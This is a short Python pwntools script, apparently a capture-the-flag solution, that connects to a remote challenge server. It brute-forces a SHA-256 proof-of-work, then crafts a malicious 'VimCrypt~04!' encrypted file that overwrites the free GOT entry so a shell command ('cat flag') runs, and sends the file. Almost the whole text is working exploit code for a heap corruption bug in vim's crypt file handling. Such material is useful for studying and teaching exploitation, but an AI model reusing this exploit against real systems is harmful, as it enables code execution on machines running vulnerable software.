import hashlib
import itertools
import string
from pwn import *

p = remote('111.186.63.13', 10001)

dat = p.recvline().strip()
p.recvuntil('XXXX:')
trail = dat[12:28]
targhash = dat[33:]

it = 0
for pref in itertools.product(string.ascii_letters + string.digits, repeat=4):
    pref = ''.join(pref)
    if it % 0x10000 == 0:
        print(pref)
    it += 1
    if targhash == hashlib.sha256(pref + trail).hexdigest():
        p.sendline(pref)
        break

p.recvline()

free_got = 0x8a8238
payload = "cat flag &>2 ||                        " + p64(0x4c915d)
offset = 0x11
print hex(len(payload))
def make_file():
    MAGIC = "VimCrypt~04!"
    IV = p32(0xFFFFFFFF^u32("a\x00\x00\x00"),endian="big")
    content = "\x02\x03\x04\x05\x06" + p64(0xcafebabedeadbeef, endian='big')* 2 + p64(free_got - 39, endian = "big")
    content += (chr(offset) + payload[::-1] + "a"*4 + p64(0xcafebabe,endian = "big") * 2 + p64(free_got - 39,endian="big")) * 2
        
    print len(content)
    filecontent = MAGIC + IV + content

    f = open("malicious","wb")
    f.write(filecontent)
    f.close()

    return filecontent

fc = make_file()

p.sendline(str(len(fc)))
p.send(fc)

p.interactive()